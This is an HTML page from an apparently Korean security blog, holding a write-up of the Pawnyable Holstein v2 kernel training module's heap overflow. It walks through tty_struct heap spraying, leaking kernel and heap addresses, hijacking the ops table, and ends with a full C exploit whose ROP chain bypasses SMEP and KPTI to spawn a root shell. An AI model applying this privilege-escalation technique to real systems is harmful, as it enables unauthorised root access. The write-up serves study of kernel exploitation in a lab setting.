@@ -1,0 +1,320 @@
+<!doctype html>
+<html lang="ko" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[KERNEL] Heap OverFlow · whrds.log</title><meta name="description" content="※ 자료들을 참고하여 분석을 진행하였기에 잘못된 부분이 있을지도 모릅니다. ※ 보완 혹은 수정해야 되는 부분이 있다면 알려주시면 확인 후 조치하도록 하겠습니다. https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module [KERNEL] Holstein Module※ 잘못된 부">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/ko/posts/kernel-heap-overflow/">
+  <link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/kernel-heap-overflow/"><link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/kernel-heap-overflow/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[KERNEL] Heap OverFlow · whrds.log"><meta property="og:description" content="※ 자료들을 참고하여 분석을 진행하였기에 잘못된 부분이 있을지도 모릅니다. ※ 보완 혹은 수정해야 되는 부분이 있다면 알려주시면 확인 후 조치하도록 하겠습니다. https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module [KERNEL] Holstein Module※ 잘못된 부"><meta property="og:url" content="https://whrds.github.io/ko/posts/kernel-heap-overflow/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[KERNEL] Heap OverFlow","description":"※ 자료들을 참고하여 분석을 진행하였기에 잘못된 부분이 있을지도 모릅니다. ※ 보완 혹은 수정해야 되는 부분이 있다면 알려주시면 확인 후 조치하도록 하겠습니다. https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module [KERNEL] Holstein Module※ 잘못된 부","datePublished":"2024-11-14","inLanguage":"ko","url":"https://whrds.github.io/ko/posts/kernel-heap-overflow/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">본문으로 건너뛰기</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/ko/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="주 메뉴">
+      <a href="/ko/" aria-current="page">글</a>
+      <a href="/ko/about/">소개</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="#" class="active" lang="ko" aria-current="true">KO</a>
+        <a href="/en/posts/kernel-heap-overflow/" class="" lang="en">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[KERNEL] Heap OverFlow</h1><p class="article-description">※ 자료들을 참고하여 분석을 진행하였기에 잘못된 부분이 있을지도 모릅니다. ※ 보완 혹은 수정해야 되는 부분이 있다면 알려주시면 확인 후 조치하도록 하겠습니다. https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module [KERNEL] Holstein Module※ 잘못된 부</p><div class="article-meta"><time datetime="2024-11-14">2024년 11월 14일</time><span>·</span><span>2 분 읽기</span></div></header><div class="prose"><p><strong>※ 자료들을 참고하여 분석을 진행하였기에 잘못된 부분이 있을지도 모릅니다.</strong> </p>
+<p><strong>※ 보완 혹은 수정해야 되는 부분이 있다면 알려주시면 확인 후 조치하도록 하겠습니다.</strong></p>
+<p><strong><a href="https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module">https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module</a></strong></p>
+<p> [[KERNEL] Holstein Module</p>
+<p>※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※  Holsteinhttps://whrdud727.tistory.com/entry/KERNEL-Environment-Setting [KERNEL] Environment Setting※ 잘못된 부분이 있으면 알려주세요.</p>
+<p><a href="http://whrdud727.tistory.com">whrdud727.tistory.com</a>](<a href="https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module">https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module</a>)</p>
+<p>위 게시글에서 Holstein v1에 대해 다루었었다.</p>
+<p>이번에는 pawnyable의 heap 취약점을 다루는 Holstein v2를 다루겠다.</p>
+<p><a href="https://pawnyable.cafe/linux-kernel/index.html">https://pawnyable.cafe/linux-kernel/index.html</a></p>
+<p> [Linux Kernel Exploitation | PAWNYABLE!</p>
+<p>Linux Kernel Exploitation</p>
+<p>pawnyable.cafe](<a href="https://pawnyable.cafe/linux-kernel/index.html">https://pawnyable.cafe/linux-kernel/index.html</a>)</p>
+<hr>
+<p>우선 코드에서 수정된 부분을 살펴보면 module_read(), module_write()에서 값을 입력하고 쓸 때의 버퍼에서 변화가 생겼다.</p>
+<pre><code>static ssize_t module_read(struct file *file,
+                           char __user *buf, size_t count,
+                           loff_t *f_pos)
+{
+  printk(KERN_INFO &quot;module_read called\n&quot;);
+
+  if (copy_to_user(buf, g_buf, count)) {
+    printk(KERN_INFO &quot;copy_to_user failed\n&quot;);
+    return -EINVAL;
+  }
+
+  return count;
+}
+
+static ssize_t module_write(struct file *file,
+                            const char __user *buf, size_t count,
+                            loff_t *f_pos)
+{
+  printk(KERN_INFO &quot;module_write called\n&quot;);
+
+  if (copy_from_user(g_buf, buf, count)) {
+    printk(KERN_INFO &quot;copy_from_user failed\n&quot;);
+    return -EINVAL;
+  }
+
+  return count;
+}
+</code></pre>
+<p>범위 검증을 수행하지 않아 취약점을 발생시키는 _copy_to_user(), _copy_from_user()이 아닌 안전한 함수들을 사용하고 있다.</p>
+<p>그 외에 가장 중요시하게 봐야되는 부분은 인자로 사용되는 부분이다.</p>
+<p>Holstein v1의 module_read()를 잠시 살펴보면 지역 변수를 하나 생성하고, 이를 이용하는 것을 볼 수 있다.</p>
+<pre><code>static ssize_t module_read(struct file *file,
+ char __user *buf, size_t count,
+ loff_t *f_pos)
+{
+ char kbuf[BUFFER_SIZE] = { 0 };
+
+ printk(KERN_INFO &quot;module_read called\n&quot;);
+
+ memcpy(kbuf, g_buf, BUFFER_SIZE);
+ if (_copy_to_user(buf, kbuf, count)) {
+ printk(KERN_INFO &quot;copy_to_user failed\n&quot;);
+ return -EINVAL;
+ }
+
+ return count;
+}
+</code></pre>
+<p>바뀐 코드에서는 지역변수를 선언하기는 하지만 g_buf 변수를 이용해서 데이터를 전달하는 것을 볼 수 있다.</p>
+<pre><code>copy_to_user(buf, g_buf, count)
+</code></pre>
+<p>이 g_buf가 어디서 어떻게 선언했는지를 살펴보면 module_open()에서 kmalloc()으로 할당하고 있는 것을 볼 수 있다.</p>
+<pre><code>static int module_open(struct inode *inode, struct file *file)
+{
+  printk(KERN_INFO &quot;module_open called\n&quot;);
+
+  g_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
+  if (!g_buf) {
+    printk(KERN_INFO &quot;kmalloc failed&quot;);
+    return -ENOMEM;
+  }
+
+  return 0;
+}
+</code></pre>
+<p>kmalloc()으로 할당한 Heap 영역에 값을 입력하고 읽어오는 것이 왜 취약할까?</p>
+<p>Kernel의 Heap 영역은 Kernel에서 사용되는 모든 드라이버와 객체들이 공유하는 영역이다.</p>
+<p>때문에 Heap 메모리의 값을 변조하여 다른 target 객체를 파괴하거나 Exploit을 하는데 사용이 가능하다.</p>
+<hr>
+<p>g_buf의 크기는 0x400이다.</p>
+<pre><code>#define BUFFER_SIZE 0x400
+</code></pre>
+<p>0x400 크기와 가장 비슷한 크기의 구조체 중에는 tty_struct가 있다.</p>
+<p>tty_struct는 tty.h에 정의되어 있으며 TTY에 대한 상태를 유지하기 위한 구조체이다.</p>
+<pre><code>struct tty_struct {
+ int magic;
+	struct kref kref;
+	struct device *dev;	/* class device or NULL (e.g. ptys, serdev) */
+	struct tty_driver *driver;
+	const struct tty_operations *ops;
+ int index;
+ ...
+</code></pre>
+<p>이 구조체가 어떤 프로세스에 의해서 실행이 되는지를 알아야 이 구조체를 사용하고, 조작하여 Exploit에 이용할 수 있다.</p>
+<p>[ /dev/ptmx ]와 같은 가상 터미널 등을 실행할 때 호출되는 구조체이며 Kernel에서 Heap을 할당하는 과정에서도 호출된다.</p>
+<p>이 구조체는 각 상태에 대해 적절한 함수를 실행하고자 함수 테이블인 ops를 포함하고 있다.</p>
+<pre><code>const struct tty_operations *ops;
+</code></pre>
+<p>이 함수 테이블을 공격자가 설정한 임의의 테이블로 overwrite하고 이를 호출되게 한다면 Exploit이 가능해진다.</p>
+<p>함수 테이블을 조작해야된다는 것 까지 확인했는데, 그러면 함수 테이블의 함수들 중에서 몇 번째 offset이 사용되는지를 확인해야 한다. 이를 위해 Heap Spray 기법을 사용해야 한다. 뿐만 아니라 Kaslr을 우회하기 위해서도 Heap Spray를 통해 Heap 메모리 영역의 데이터를 읽어야 한다. </p>
+<ul>
+<li>Heap Spray로 Kernel base와 임임의 테이블을 구성할 주소 구하기</li>
+<li>Heap Spray로 함수 테이블 중 몇 번째 Offset이 사용되는지를 확인하기</li>
+</ul>
+<p>먼저 memory leak을 수행할 값을 찾기 위해 main()를 다음과 같이 구성한다.</p>
+<pre><code>int main() {
+ int spray[100];
+ for (int i = 0; i &lt; 50; i++) {
+ spray[i] = open(&quot;/dev/ptmx&quot;, O_RDONLY | O_NOCTTY);
+ if (spray[i] == -1)
+ fatal(&quot;/dev/ptmx&quot;);
+ }
+
+ int fd = open(&quot;/dev/holstein&quot;, O_RDWR);
+ if (fd == -1)
+ fatal(&quot;/dev/holstein&quot;);
+
+ for (int i = 50; i &lt; 100; i++) {
+ spray[i] = open(&quot;/dev/ptmx&quot;, O_RDONLY | O_NOCTTY);
+ if (spray[i] == -1)
+ fatal(&quot;/dev/ptmx&quot;);
+ }
+
+ char buf[0x500];
+ memset(buf, 'A', 0x500);
+ write(fd, buf, 0x500);
+
+ getchar(); 
+
+ close(fd);
+ return 0;
+}
+</code></pre>
+<p>[ /dev/ptmx ]를 open하는 방식으로 tty_struct를 포함한 메모리를 펼치게 되고 이를 User 공간으로 불려와 Debugging을 수행한다.</p>
+<p><img src="/assets/images/tistory/tistory-1b15a9a45937/001.png" alt=""></p>
+<p>g_buf가 사용되는 위치에 bp를 걸고 해당 주소를 분석한다.</p>
+<p><img src="/assets/images/tistory/tistory-1b15a9a45937/002.png" alt=""></p>
+<p>유사한 형태의 구조가 계속 이어지는 것을 볼 수 있는데, 이 부분이 tty_struct이다.</p>
+<p>이 공간들 중 Kernel단의 주소와 fake func table 구축을 위한 Heap 주소를 가지고 있는 부분을 탐색한다.</p>
+<p><img src="/assets/images/tistory/tistory-1b15a9a45937/003.png" alt=""></p>
+<p>0x418 위치에서 Kernel Base를 계산하기 위한 값을 찾을 수 있다.</p>
+<p>해당 위치는 원래의 함수 테이블이 위치를 하고 있는 부분으로, 함수 테이블의 경우 커널 위에 존재하게 된다.</p>
+<p><img src="/assets/images/tistory/tistory-1b15a9a45937/004.png" alt=""></p>
+<p>Heap 주소는 0x438에서 찾을 수 있다.</p>
+<pre><code> char buf[0x500];
+ read(fd, buf, 0x500);
+ kbase = *(unsigned long*)&amp;buf[0x418] - ofs_tty_ops;
+ printf(&quot;[+] kbase = 0x%016lx\n&quot;, kbase);
+ 
+ g_buf = *(unsigned long*)&amp;buf[0x438] - 0x438;
+printf(&quot;[+] g_buf = 0x%016lx\n&quot;, g_buf);
+</code></pre>
+<p>해당 값들을 활용하여 각 주소들을 구한다.</p>
+<p>다음 해야하는 것은 함수 테이블 중 몇 번째 offset이 실행되는지를 봐야 하는데, 이는 0x418에 있는 값을 fake func table로 조작하고, 함수 테이블에는 0~n 까지 숫자를 커지는 주소들이 위치하게 하면 쉽게 구할 수 있다.</p>
+<pre><code>unsigned long *p = (unsigned long*)&amp;buf;
+for (int i = 0; i &lt; 0x40; i++) {
+ *p++ = 0xffffffffdead0000 + (i &lt;&lt; 8);
+}
+*(unsigned long*)&amp;buf[0x418] = g_buf;
+write(fd, buf, 0x420);
+
+for (int i = 0; i &lt; 100; i++) {
+ ioctl(spray[i], 0xdeadbeef, 0xcafebabe);
+}
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-1b15a9a45937/005.png" alt=""></p>
+<p>offset이 0xc 인것을 확인할 수 있다.</p>
+<p>rip 레지스터를 조작할 수 있기 때문에 SMEP를 우회할 수 있게 된다. </p>
+<p>Exploit은 kpti까지 우회하는 코드로 작성해주면 되는데 아래 링크에서 한번 다루었었다.</p>
+<p><a href="https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass">https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass</a></p>
+<p> [[KERNEL] KROP_(SMEP bypass)</p>
+<p>※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 유저 영역에서 ROP는 NX-BIT 보호 기법을 우회하기 위해서 사용했었다. 커널 영역에서의 ROP 역시 SMEP라는 보호기법을</p>
+<p><a href="http://whrdud727.tistory.com">whrdud727.tistory.com</a>](<a href="https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass">https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass</a>)</p>
+<p><a href="https://whrdud727.tistory.com/entry/KERNEL-KROPKPTI-bypass">https://whrdud727.tistory.com/entry/KERNEL-KROPKPTI-bypass</a></p>
+<p> [[KERNEL] KROP_(KPTI bypass)</p>
+<p>※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※이번엔 SMEP, SMAP와 함께 KPTI 보호 기법을 우회하는 KROP를 다뤄보겠다.  #!/bin/shqemu-system-x86_64 \ -m 64M \ -nographic \ -kernel bz</p>
+<p><a href="http://whrdud727.tistory.com">whrdud727.tistory.com</a>](<a href="https://whrdud727.tistory.com/entry/KERNEL-KROPKPTI-bypass">https://whrdud727.tistory.com/entry/KERNEL-KROPKPTI-bypass</a>)</p>
+<p>전체 Exploit 코드이다.</p>
+<pre><code>#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;unistd.h&gt;
+
+#define ofs_tty_ops 0xc38880
+#define addr_commit_creds (kbase + 0x0744b0)
+#define addr_prepare_kernel_cred (kbase + 0x074650)
+#define rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp (kbase + 0x3a478a)
+#define rop_pop_rdi (kbase + 0x0d748d)
+#define rop_pop_rcx (kbase + 0x13c1c4)
+#define rop_mov_rdi_rax_rep_movsq (kbase + 0x62707b)
+#define rop_bypass_kpti (kbase + 0x800e26)
+
+unsigned long kbase, g_buf;
+unsigned long user_cs, user_ss, user_rsp, user_rflags;
+
+static void win() {
+  char *argv[] = { &quot;/bin/sh&quot;, NULL };
+  char *envp[] = { NULL };
+  puts(&quot;[+] win!&quot;);
+  execve(&quot;/bin/sh&quot;, argv, envp);
+}
+
+static void save_state() {
+  asm(
+      &quot;movq %%cs, %0\n&quot;
+      &quot;movq %%ss, %1\n&quot;
+      &quot;movq %%rsp, %2\n&quot;
+      &quot;pushfq\n&quot;
+      &quot;popq %3\n&quot;
+      : &quot;=r&quot;(user_cs), &quot;=r&quot;(user_ss), &quot;=r&quot;(user_rsp), &quot;=r&quot;(user_rflags)
+      :
+      : &quot;memory&quot;);
+}
+
+void fatal(const char *msg) {
+  perror(msg);
+  exit(1);
+}
+
+int main() {
+  save_state();
+
+  // tty_struct�췷pray
+  int spray[100];
+  for (int i = 0; i &lt; 50; i++) {
+    spray[i] = open(&quot;/dev/ptmx&quot;, O_RDONLY | O_NOCTTY);
+    if (spray[i] == -1)
+      fatal(&quot;/dev/ptmx&quot;);
+  }
+
+  int fd = open(&quot;/dev/holstein&quot;, O_RDWR);
+  if (fd == -1)
+    fatal(&quot;/dev/holstein&quot;);
+
+  for (int i = 50; i &lt; 100; i++) {
+    spray[i] = open(&quot;/dev/ptmx&quot;, O_RDONLY | O_NOCTTY);
+    if (spray[i] == -1)
+      fatal(&quot;/dev/ptmx&quot;);
+  }
+
+  char buf[0x500];
+  read(fd, buf, 0x500);
+  kbase = *(unsigned long*)&amp;buf[0x418] - ofs_tty_ops;
+  printf(&quot;[+] kbase = 0x%016lx\n&quot;, kbase);
+
+  g_buf = *(unsigned long*)&amp;buf[0x438] - 0x438;
+  printf(&quot;[+] g_buf = 0x%016lx\n&quot;, g_buf);
+
+  unsigned long *p = (unsigned long*)&amp;buf[0x400];
+  p[12] = rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp;
+  *(unsigned long*)&amp;buf[0x418] = g_buf + 0x400;
+
+  unsigned long *chain = (unsigned long*)&amp;buf;
+  *chain++ = rop_pop_rdi;
+  *chain++ = 0;
+  *chain++ = addr_prepare_kernel_cred;
+  *chain++ = rop_pop_rcx;
+  *chain++ = 0;
+  *chain++ = rop_mov_rdi_rax_rep_movsq;
+  *chain++ = addr_commit_creds;
+  *chain++ = rop_bypass_kpti;
+  *chain++ = 0xdeadbeef;
+  *chain++ = 0xdeadbeef;
+  *chain++ = (unsigned long)&amp;win;
+  *chain++ = user_cs;
+  *chain++ = user_rflags;
+  *chain++ = user_rsp;
+  *chain++ = user_ss;
+
+  write(fd, buf, 0x500);
+
+  for (int i = 0; i &lt; 100; i++) {
+    ioctl(spray[i], 0xdeadbeef, g_buf - 0x10); 
+  }
+
+  getchar();
+  return 0;
+}
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-1b15a9a45937/006.png" alt=""></p>
+<p>성공적으로 권한 상승에 성공했다.</p>
+<p>아래 이미지는 위 Exploit 코드를 분석하면서 정리했던 부분이다.</p>
+<p>정확하지 않는 부분도 있겠지만 참고해서 보면 될 것 같다.</p>
+<p><img src="/assets/images/tistory/tistory-1b15a9a45937/007.png" alt=""></p>
+</div><div class="article-end"><a href="/ko/">← 모든 글 보기</a><a href="/en/posts/kernel-heap-overflow/" hreflang="en">이 글을 영어로 읽기 →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>관찰하고, 검증하고, 기록합니다.</span><a href="/ko/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
